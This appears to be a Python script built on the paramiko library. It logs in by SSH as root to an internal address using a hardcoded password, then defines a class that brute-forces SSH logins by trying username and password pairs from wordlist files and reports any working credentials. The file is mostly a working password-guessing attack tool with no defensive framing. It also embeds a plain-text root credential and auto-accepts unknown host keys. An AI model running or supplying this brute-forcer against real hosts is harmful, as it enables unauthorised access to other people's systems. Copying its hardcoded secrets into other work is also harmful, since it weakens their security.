# -*- coding: utf-8 -*-
"""
Created on Fri Jul  9 07:10:42 2021

@author: SKOTIYAL
"""

import paramiko
import os, sys

dip='10.53.215.215'
dname='root'
dpassword='Airvana123'
dport='22'
cmd1 = "ifconfig"
cmd2 = "route"
cmd3 = "ls -lrt"

try: 
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    """
    stdin, stdout, stderr = ssh.exec_command(cmd1)
    output = stdout.readines()
    print("\n".join(output))
    print(stderr.readlines())
    """
    ssh.load_system_host_keys()
    ssh.connect(dip,port =22, username = dname,password=dpassword)
    ssh_session = ssh.get_transport().open_session()

#for error: <paramiko.ChannelFile from <paramiko.Channel 0 (closed) -> <paramiko.Transport at 0xb46b45c8 (cipher aes128-ctr, 128 bits) (active; 0 open channel(s))>>>
    
    if ssh_session.active:
        stdin, stdout, stderr = ssh.exec_command(cmd2)
        print(stdout.read())
    
    ssh.close()
    
except Exception as e:
    print ("error:",e)





class SSHConnection:

    def __init__(self):
        #ssh connection with paramiko library
        self.ssh = paramiko.SSHClient()

    def ssh_connect(self,ip,user,password,code=0):
        self.ssh.load_system_host_keys()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("[*] Testing user and password from dictionary")
        print("[*] User: %s" %(user))
        print("[*] Pass :%s" %(password))
        try:
            self.ssh.connect(ip,port=22,username=user,password=password,timeout=5)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error as e:
            code = 2
            self.ssh.close()
        return code
    
    def startSSHBruteForce(self,host):
        try:
            #open files dictionary
            users_file = open("users.txt")
            passwords_file = open("passwords.txt")
            for user in users_file.readlines():
                for password in passwords_file.readlines():
                    user_text = user.strip("\n")
                    password_text = password.strip("\n")
                    try:
                    #check connection with user and password
                        response = self.ssh_connect(host,user_text,password_text)
                        if response == 0:
                            print("[*] User: %s [*] Pass Found:%s" %(user_text,password_text))
                            stdin,stdout,stderr = self.ssh.exec_command("ifconfig")
                            for line in stdout.readlines():
                                print(line.strip())
                            sys.exit(0)
                        elif response == 1:
                            print("[*]Login incorrect")
                        elif response == 2:
                            print("[*] Connection could not be established to %s" %(host))
                            sys.exit(2)
                    except Exception as e:
                        print("Error ssh connection")
                        pass
            #close files
            users_file.close()
            passwords_file.close()
        except Exception as e:
            print("users.txt /passwords.txt Not found")
            pass

